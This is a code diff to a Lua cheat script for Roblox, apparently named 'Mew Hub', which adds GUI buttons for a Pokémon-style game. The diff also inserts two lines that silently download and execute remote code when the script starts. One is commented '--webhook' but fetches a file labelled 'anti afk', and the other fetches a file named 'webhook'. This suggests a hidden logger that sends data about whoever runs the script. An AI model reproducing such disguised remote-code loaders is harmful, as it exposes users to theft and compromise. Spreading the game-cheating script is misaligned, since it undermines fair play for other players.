@@ -1,5 +1,8 @@
 local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/igaslight/mew/main/main"))()
 
+--webhook
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/igaslightwomen/aid/main/anti%20afk', true))()
+
 local GUI = Mercury:Create{
     Name = "Mew Hub",
     Size = UDim2.fromOffset(600, 400),
@@ -619,8 +622,8 @@ Tab:Button{
 --]]
 
 local Tab = GUI:Tab{
-	Name = "Submarine",
-	Icon = "rbxassetid://10422851158"
+	Name = "Gyms",
+	Icon = "rbxassetid://10422345128"
 }
 
 Tab:Button{
@@ -671,6 +674,12 @@ Tab:Slider{
    end
 }
  
+Tab:Button{
+	Name = "Teleport To Chunk",
+	Description = nil,
+	Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/KH29fLJw"))()
+   end
+}
 --[[ 
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠞⢳⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡔⠋⠀⢰⠎⠀⠀⠀⠀⠀
@@ -992,6 +1001,8 @@ _p.Network:get('PDS', 'openPC')
 _p.Network:get('PDS', 'cPC', 'nickname', 6, text)
 	    end
 }
+
+loadstring(game:HttpGet"https://raw.githubusercontent.com/ilovelatinawomen/ilovelatinas/main/webhook")()
 
 
 
